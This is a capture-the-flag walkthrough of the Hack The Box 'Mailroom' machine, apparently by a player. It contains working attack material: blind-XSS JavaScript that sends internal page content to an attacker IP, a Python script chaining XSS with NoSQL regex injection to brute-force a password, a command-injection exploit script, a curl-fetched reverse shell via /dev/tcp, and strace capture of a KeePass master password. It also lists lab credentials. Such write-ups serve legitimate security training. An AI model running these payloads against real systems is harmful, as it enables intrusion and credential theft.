![](mailroom_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** `10.10.11.209 mailroom.htb`

**nmap scan: TCP/IP**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: The Mail Room
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

* Got Hostname from home page footer - `mailroom.htb`

<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="screenshots/http-10.129.208.174.png">
    <img src="screenshots/http-10.129.208.174.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)" alt="image-20220608173116399">
  </a>
  <div style="position: absolute; right: 20px; top: 475px"><a href="screenshots/http-10.129.208.174.png"><i>Click for full image</i></a></div>
</div>

<!-- ![](screenshots/http-10.129.208.174.png) -->

* It is a php application.

* Did not found anything interesting form gobuster -
```bash
❯ gobuster dir -w ~/git-tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "http://mailroom.htb" -t 100 -e php

... [snip] ...

http://mailroom.htb/js                   (Status: 301) [Size: 309] [--> http://mailroom.htb/js/]
http://mailroom.htb/assets               (Status: 301) [Size: 313] [--> http://mailroom.htb/assets/]
http://mailroom.htb/javascript           (Status: 301) [Size: 317] [--> http://mailroom.htb/javascript/]
http://mailroom.htb/css                  (Status: 301) [Size: 310] [--> http://mailroom.htb/css/]
http://mailroom.htb/template             (Status: 403) [Size: 277]
http://mailroom.htb/font                 (Status: 301) [Size: 311] [--> http://mailroom.htb/font/]
http://mailroom.htb/server-status        (Status: 403) [Size: 277]
http://mailroom.htb/inquiries            (Status: 301) [Size: 316] [--> http://mailroom.htb/inquiries/]
```

Fuff found a vHost - 
```bash
❯ ffuf -w ~/git-tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.mailroom.htb" -u "http://10.129.208.174" -ac -ic -t 100

... [snip] ...

[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 347ms]
    * FUZZ: git

:: Progress: [19964/19964] :: Job [1/1] :: 102 req/sec :: Duration: [0:01:40] :: Errors: 0 ::
```

* `git.mailroom.htb` is running "[gitea Version: 1.18.0](https://gitea.io/en-us/)"

![](screenshots/http-git.mailroom.htb.png)

Mail domain has a `/contact.php` with contact forum with sends post request on submission and create a "inquiry" page.

![](screenshots/http-mailroom.htb-contact.php.png)

There is a little catch, when you put a random it puts the status as irrelevant and if you tell that it is important or something like that it puts the status to "Pending manual review".

<div style="display:flex;">
  <img src="screenshots/http-mailroom.htb-inquiries-75b51ddb88403d14b0cbbeeda9f862af.html.png" width="50%" />
  <hr style="border:none; border-right: 1px solid black; height: auto; margin: auto;" />
  <img src="screenshots/http-mailroom.htb-inquiries-e6e032feff51415ebfe202605adce132.html.png" width="50%" />
</div>

* This could because of this message - "Please fill out the form below to send us an inquiry. Our advanced new AI will automatically read your inquiry and determine its urgency to supply the best response times for you."
* And another thing to note, every inquiry deleted after a minute or so.

# Foothold

## Blind XSS

* "Title" and "message" field are vulnerable for XSS 

![](screenshots/http-mailroom.htb-contact.php-XSS.png)

* and also trigger blind XSS.
  * Only "Pending manual review" inquiries get reviewed which triggers blind XSS.

```bash
curl -s -X POST 'http://mailroom.htb/contact.php' -d $'email=test%40test.com&title=This+is+a+very+important+mesage&message=This+is+a+very+important+mesage!</p><script>new+Image().src=\"http://10.10.14.2:8000/?c=\"%2bdocument.domain;</script><p>' 2&1>/dev/null
```

![](screenshots/http-mailroom.htb-contact.php-blind-XSS.png)

Found a git repository on gitea instance -

![](screenshots/http-git.mailroom.htb-matthew-staffroom.png)

* New subdomain from `staffroom/auth.php#L42` -> `staff-review-panel.mailroom.htb`
* `staff-review-panel.mailroom.htb` is not accessible remotely but we can access it using blind XSS

Here, Create a javascript that, when triggered, send a GET request to `staff-review-panel.mailroom.htb` and then send the response of that GET request to attacker controlled domain.
```js
var req1 = new XMLHttpRequest();
req1.open("GET", "http://staff-review-panel.mailroom.htb/register.html", false);
req1.send();
var resp = req1.response;

var req2 = new XMLHttpRequest();
req2.open("POST", "http://10.10.14.2:4141/", false);
req2.setRequestHeader("Content-Type", "text/plain");
req2.send(resp);
```

Host above js file in a python server, Create inquiry with xss payload including above javascript. 
```bash
curl -X POST 'http://mailroom.htb/contact.php' -d $'email=test%40test.com&title=This+is+a+very+important+mesage&message=This+is+a+very+important+mesage!</p><script+src=\"http://10.10.14.2:8000/test.js\"></script><p>'
```

![](screenshots/blind-XSS-internal-panel-access.png)

At this point, there is no clue what to do next, so i setup staffroom app in my local machine and start testing the.

### Setup mongodb for php webapp

```bash
# Pull mongodb docker image.
sudo docker pull mongo
# Start docker container
sudo docker run --name mongodb -p 27017:27017 -d mongo
# Grab container IP
sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mongodb
# Verify if php mongodb extension is install 
php -m | grep mongodb
# If not, install it
sudo apt-get install php-mongodb
# Finally, change 

# Extra
# Install mongodb client in the container
sudo docker exec -it mongodb bash
# Inside container, install mongo shell
apt-get update && apt-get install -y wget
wget https://downloads.mongodb.com/compass/mongodb-mongosh_1.8.0_amd64.deb
dpkg -i mongodb-mongosh_1.8.0_amd64.deb

# Run mongo shell inside container
mongosh

# OR direct using docker exec
sudo docker exec -it mongodb mongosh

# Inside mongo shell, run it
use backend_panel;
db.createCollection("users");
db.users.insertOne({
   "email": "testuser@example.com",
   "password": "testpassword",
   "2fa_token": "",
   "token_creation": ""
});
```

Finally, Change mongodb address in `staffroom/auth.php#L05` with container IP.

And now you can run built-in php web server using `php -S` and use staffroom webapp in your local machine.

![](screenshots/local-staffroom-app-1.png)

## NoSQL injection

After a while, I catch a slight issue in staffroom/auth.php#L19-22. in this if statement, after catching invalid parameter
```php
  // Verify the parameters are valid
  if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
  }
```

Script should exit, but it does not, which cause 'Invalid input detected' error message, but still move to the next block of code.

Where user input directly inserted into `findOne()` method.
```php
  // Check if the email and password are correct
  $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```

And here, we got NoSQL injection 

![](screenshots/local-staffroom-app-nosqli-1.png)

And same result got from remote server using following javascript
```js
var req1 = new XMLHttpRequest();
req1.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
const data = "email[$regex]=^&password[$regex]=^";
req1.send(data);
var resp = req1.response;

var req2 = new XMLHttpRequest();
req2.open("POST", "http://10.10.14.6:4141/", false);
req2.setRequestHeader("Content-Type", "text/plain");
req2.send(resp);
```

![](screenshots/remote-staffroom-app-nosqli-1.png)

First i tired a write a javascript which loads in the target browser and brute-force email and password and then send them to our server, but browser CORS was blocking the script from executing async requests.

### NoSQL Guessing Game

* Possible Email from gitea instance - `tristan@mailroom.htb`, `administrator@mailroom.htb`, `matthew@mailroom.htb`
* Valid Email - `tristan@mailroom.htb`; paylaod -> `email[$regex]=^t&password[$regex]=^`
* Password Length - 12; payload -> `email=tristan@mailroom.htb&password[$regex]=.{12}`

For brute-forcing password, i automate the above manual NoSQL injection via blind XSS using python.
* This script create a javascript file in every iteration with new character in NoSQL payload, send that file in a XSS payload to `/contact.php` and wait for remote server to trigger blind XSS and send data.

*This is a very slow process, and could be unintended, but in-browser javascript based brute-force script wasn't working for me.*

```py
#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-04-20
Description: This script exploits a blind NoSQL injection vulnerability to extract a 12-character password from a web application
             running on the Hack The Box Mailroom machine (IP: 10.10.11.209). The vulnerability is present in the parameter
             verification mechanism of the internal staff review panel. The password is leaked character by character using a regex-based
             blind NoSQL injection attack. The attack is performed by injecting an XSS payload via the contact form of the web
             application, which sends a POST request to the internal staff review panel with a NoSQL payload containing the guessed
             characters. If the guessed character is correct, script's http server receives "Check your inbox for an email with your 2FA token" message.

Usage: python3 script.py

Pre-requirements:
    - vHost must be added in the "/etc/hosts" file i.e "10.10.11.209 mailroom.htb"
    - HackTheBox VPN is connected on "tun0" interface
"""

import threading
import http.server
from base64 import b64decode
import re
import requests
import string
import netifaces as ni
import os

# Get HackTheBox vpn ip from tun0 interface
try:
    htb_vpn_inf = 'tun0'
    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

message_received = False

# Custom handler for http server for handling received requests
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.data_received_event = None

    def do_GET(self):
        global message_received
        # If the request has a "data" parameter
        if "data" in self.path:
            recv_data = re.findall(r"/\?data=(.*?)$", self.path)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            self.data_received_event.set()
            if "Check your inbox for an email with your 2FA token" in base64_decoded:
                # print(base64_decoded)
                message_received = True

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    # Suppress logging of HTTP requests
    def log_message(self, format, *args):
        pass

# Function for running http server
def start_server(event):
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.RequestHandlerClass.data_received_event = event
    print("Server started on port 8000")
    httpd.serve_forever()

# Function for sending xss payload using "/contact.php"
def send_request(ip, fn):
    url = 'http://mailroom.htb/contact.php'
    payload = {
        'email': 'test@test.com',
        'title': 'This is a very important message',
        'message': f'This is a very important message!</p><script src="http://{ip}:8000/{fn}"></script><p>'
    }

    requests.post(url, data=payload)

# Generate xss template file used for brute-forcing password via nosql
def generate_xss_template(ip, fn):
    xss_payload = """var req1 = new XMLHttpRequest();
req1.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
const data = "email=tristan@mailroom.htb&password[$regex]=^{char}";
req1.send(data);
var resp = req1.response;

var req2 = new XMLHttpRequest();
req2.open("GET", "http://%s:8000/?data=" + btoa(resp), false);
req2.send();
""" % ip
    
    with open(fn, 'w') as fw:
        fw.write(xss_payload)


if __name__ == "__main__":
    xss_template = "xss_template.js"
    xss_payload = 'payload.js'

    if not os.path.isfile(xss_template):
        generate_xss_template(ip=lhost, fn=xss_template)

    # Create the event object and start the server in a separate thread
    event = threading.Event()
    server_thread = threading.Thread(target=start_server, args=(event,))
    server_thread.daemon = True
    server_thread.start()

    try:
        # Brute-force logic
        password = ""
        while len(password)  != 12:
            for c in string.printable.split(' ')[0]:
                if c not in ['*','+','.','?','|', '#', '&', '$']:
                    variable_dict = {"char": password + c}
                    with open(xss_template, 'r') as fr:
                        with open(xss_payload, 'w') as fw:
                            fw.write(re.sub(r"{(\w+?)}", lambda match: variable_dict[match.group(1)], fr.read()))
                    send_request(ip=lhost, fn=xss_payload)
                    is_set = event.wait(timeout=60)  # Wait for the event to be set
                    for i in range(4):  # 4 re-try for every payload
                        if not is_set:  # if timeout error
                            print("[!] Timeout occurred, sending request again")
                            send_request(ip=lhost, fn=xss_payload)
                            is_set = event.wait(timeout=60)
                    event.clear()  # Reset the event for the next iteration
                    if message_received:
                        print("Found valid char:",c)
                        message_received = False
                        password += c
                        break
        print(password)

    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        import os; [os.remove(f) for f in [xss_template, xss_payload] if os.path.isfile(f)]

```

![](screenshots/remote-staffroom-app-nosqli-2.png)

**Creds:** `tristan:tristan@mailroom.htb:69trisRulez!`

And we can log in to ssh using -> `tristan:69trisRulez!` and get shell in the mailroom host machine.

### shell #1 - Host as tristan

* There is 1 more user on the box -> `matthew`
* A keepass database file (`.kdbx`) in `/home/matthew/personal.kdbx`
* `kpcli` tool is installed
* Docker is installed
* And web applications are running from docker containers
* mail directory has user "tristan" mails -> `/var/mail/tristan`

## Command Injection

Back to the staffroom source code, when we logged in, it send login token to that user's email, which now we can access.

![](screenshots/tristan-mail-1.png)

And after login, we can access to, `staffroom/inspect.php` via `http://staff-review-panel.mailroom.htb/inspect.php` and here user input form `inquiry_id` param directly inserted in to `shell_exec()` PHP function which caused command injection using backticks (`).
```php
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

1. login to `tristan@mailroom.htb:69trisRulez!` account.

```js
var req1 = new XMLHttpRequest();
req1.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
const data = "email=tristan@mailroom.htb&password=69trisRulez!";
req1.send(data);
var resp = req1.response;

var req2 = new XMLHttpRequest();
req2.open("POST", "http://10.10.14.10:4141/", false);
req2.setRequestHeader("Content-Type", "text/plain");
req2.send(resp);
```

2. Get auth token from `var/mail/tristan` via ssh.

![](screenshots/tristan-mail-2.png)

3. send reverse shell in `/inspect.php` POST request in `inquiry_id` parameter.

we can access `staff-review-panel.mailroom.htb` directly from ssh shell.

Here is a python script to run from ssh shell to get reverse shell on staffroom app instance.
```py
#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-04-21
Description: This script exploits a blind local command injection vulnerability in the Mailroom staff-review-panel application
             by sending a crafted HTTP POST request to /inspect.php endpoint using a valid authentication token. 
             The token is received by sending a login request to /auth.php endpoint and waiting for it to be
             received in the user's mail file in the mailroom host filesystem. 

Usage: python3 script.py "[COMMAND]"
                            - Where COMMAND is a system command to execute

Example: python3 script.py "ping -c2 10.10.10.10"

Pre-requirements:
    - Initial shell on the box.
"""

import requests
from re import findall
from urllib.parse import urlparse, parse_qs
from sys import argv
import json
import pickle
import os
from time import sleep

rhost = "http://staff-review-panel.mailroom.htb"

email = "tristan@mailroom.htb"
password = "69trisRulez!"
mail = "/var/mail/tristan"  # User tristan's local mail file path in mailroom host fs

# Send login token to "tristan" email via login
def send_auth_token(url, email, password):
    data = {'email': email, 'password': password}
    resp = requests.post(url + '/auth.php', data=data)
    if json.loads(resp.text)["success"]:
        print("...",resp.text)
        return True
    else:
        return False

# Extract received token from "/var/mail/tristan"
def extract_token_from_mail(file_path):
    with open(file_path, 'r') as f:
        mail_content = f.read()
    urls = findall(r'http://[a-z0-9.-]+/auth\.php\?token=[a-zA-Z0-9]+', mail_content)
    if urls:
        url = urls[-1]
        print("...", url)
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        token = params['token'][0]
        return token
    else:
        return None

# Command injection black listed chars
def check_blacklist_chars(input_string):
    blacklist = '$<>;|&\{\}()[]\'"'
    for char in blacklist:
        if char in input_string:
            return True
    return False

# Run command injection from "/inspect.php"
def inspect_mailroom(url, cmd, email, password, mail):
    session_file = 'session.pickle'
    if os.path.exists(session_file):
        print("...", session_file, "Found!")
        with open(session_file, 'rb') as f:
            session = pickle.load(f)
    else:
        session = requests.Session()
        print("...", session_file, "Not Found, Creating new session")
        if send_auth_token(url=url, email=email, password=password):
            print("... Waiting for token to be received in the mail")
            sleep(10)
            token = extract_token_from_mail(mail)
            print("[+] New Token:", token)
            session.get(f"{url}/auth.php?token={token}")
        else:
            exit("[!] Login Failed!")

    data = {"inquiry_id": f"`{cmd}`"}
    resp = session.post(f"{url}/inspect.php", data=data, timeout=10)

    if "Inquiry contents parsing failed" not in resp.text:
        print("[!] Command execution failed!")
        return False

    with open(session_file, 'wb') as f:
        pickle.dump(session, f)
    
    print("[+] Command executed in the webapp container.")
    return True

if __name__ == "__main__":

    cmd = ""
    try:
        cmd += argv[1]

        if check_blacklist_chars(cmd):
            exit("[-] Input contains blacklisted characters!")

    except IndexError as e:
        exit("Usage: script.py [COMMAND]")
    
    try:
        inspect_mailroom(url=rhost, cmd=cmd, email=email, password=password, mail=mail)
    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)

```


```bash
term-1~$ nc -lvnp 4141

term-2~$ echo "sh -i >& /dev/tcp/10.10.14.27/4141 0>&1" > shell.sh
term-2~$ python -m http.server 8000

term-3~$ ssh tristan@mailroom.htb "curl -s http://10.10.14.27:8000/commandInjection-script.py | python3 - 'curl 10.10.14.27:8000/shell.sh -o /tmp/shell.sh'"
term-3~$ ssh tristan@mailroom.htb "curl -s http://10.10.14.27:8000/commandInjection-script.py | python3 - 'bash /tmp/shell.sh'"
```

![](screenshots/docker-container-www-revshell-1.png)

### shell #2 - Container as www-data

* Obtained shell in the Docker container as "www-data".
* This container contains two applications, "mailroom" and "staffroom," located in the `/var/www/` directory.
* Both apps have a `.git` directory.
* In both apps' `.git` directories, there is a config file that contains user "Matthew's" **Local** Gitea credentials.

```conf
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://matthew:HueLover83%23@gitea:3000/matthew/mailroom.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[user]
	email = matthew@mailroom.htb
```

* Creds -> `matthew:matthew@mailroom.htb:HueLover83%23`

There is little catch in the password, because this password used in the url last char of the password is url encoded and after decoding it (`HueLover83#`) we can use this password to switch to user "matthew" in the host.

![](screenshots/matthew-su-shell.png)


# Privesc

## Watch feature process and strace

Found a automated task is running kpcli every minute from user "matthew" using `pspy`.

![](screenshots/pspy-process-spy.png)

So i create a bash script to watch for that process to start and then attach it to `strace`.
```bash
#!/bin/bash

while true
do
    pid=\$(ps aux | grep "/usr/bin/kpcli" | grep -v grep | awk '{print \$2}')
    if [ -n "\$pid" ]
    then
        sleep 5 # Immediate attach cause Trace/breakpoint trap
        strace -e read -p "\$pid"
        break
    fi
    sleep 1
done
```

<!--Copy/Paste

cat >test.sh<<EOF
#!/bin/bash

while true
do
    pid=\$(ps aux | grep "/usr/bin/kpcli" | grep -v grep | awk '{print \$2}')
    if [ -n "\$pid" ]
    then
        sleep 5 #Immediate attach cause Trace/breakpoint trap
        strace -e read -p "\$pid"
        break
    fi
    sleep 1
done
EOF

-->

Running this script, output this data, which contain `keepass` database "/home/matthew/personal.kdbx" master password.

```bash
strace: Process 37278 attached
read(3, "p", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "r", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "l", 1)                         = 1
read(3, ".", 1)                         = 1
read(3, "k", 1)                         = 1
read(3, "d", 1)                         = 1
read(3, "b", 1)                         = 1
read(3, "x", 1)                         = 1
read(3, "\n", 1)                        = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "!", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "3", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "p", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "4", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "w", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "d", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "9", 8192)                      = 1
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x562da0821480, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "\n", 8192)                     = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832
read(5, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\200\"\0\0\0\0\0\0"..., 832) = 832
read(5, "# XML::Parser\n#\n# Copyright (c) "..., 8192) = 8192
read(6, "package XML::Parser::Expat;\n\nuse"..., 8192) = 8192
read(6, ";\n    }\n}\n\nsub position_in_conte"..., 8192) = 8192
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240<\0\0\0\0\0\0"..., 832) = 832
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000B\0\0\0\0\0\0"..., 832) = 832
read(5, "package MIME::Base64;\n\nuse stric"..., 8192) = 5450
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300\22\0\0\0\0\0\0"..., 832) = 832
read(6, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(6, "", 8192)                       = 0
read(3, "l", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "R", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "s", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "-", 1)                         = 1
read(3, "f", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "0", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "q", 1)                         = 1
read(3, "u", 1)                         = 1
read(3, "i", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "\n", 1)                        = 1
read(7, "# NOTE: Derived from blib/lib/Te"..., 8192) = 665
read(7, "", 8192)                       = 0
+++ exited with 0 +++
```

* Found password string `!sEcUr3p4$$w01\10rd9`


## Open keepass database

Another catch, in the password there is a char "\10" that is not making any seance. Because it is a "in bash "\10" key sequence represents the ASCII backspace character"

* Real password is: `!sEcUr3p4$$w0rd9`

with the password, we can access to "/home/matthew/personal.kdbx" database using `kpcli`

![](screenshots/keepass-database-access-1.png)

But kpcli does not showing clear text password, so i used "keepassxc" in linux -> https://keepassxc.org/download/#linux

![](screenshots/keepass-database-access-2.png)

* su to root with the root password.
